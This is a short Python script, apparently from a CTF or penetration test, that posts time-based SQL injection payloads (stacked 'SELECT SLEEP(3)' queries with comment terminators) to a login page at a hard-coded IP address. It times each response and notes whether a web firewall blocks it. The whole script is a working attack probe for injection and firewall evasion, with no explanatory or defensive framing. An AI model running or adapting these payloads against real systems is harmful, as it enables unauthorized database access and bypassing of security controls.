import requests, time

def timed_test(payload, label=""):
    start = time.time()
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"})
    elapsed = time.time() - start
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:35}] time={elapsed:.2f}s waf={waf}")

timed_test("admin", "baseline-no-injection")
timed_test("admin'; SELECT SLEEP(3)#", "stacked-sleep-hash")
timed_test("admin'; SELECT SLEEP(3);#", "stacked-sleep-semicolon-hash")
timed_test("'; SELECT SLEEP(3)#", "stacked-sleep-empty-user")
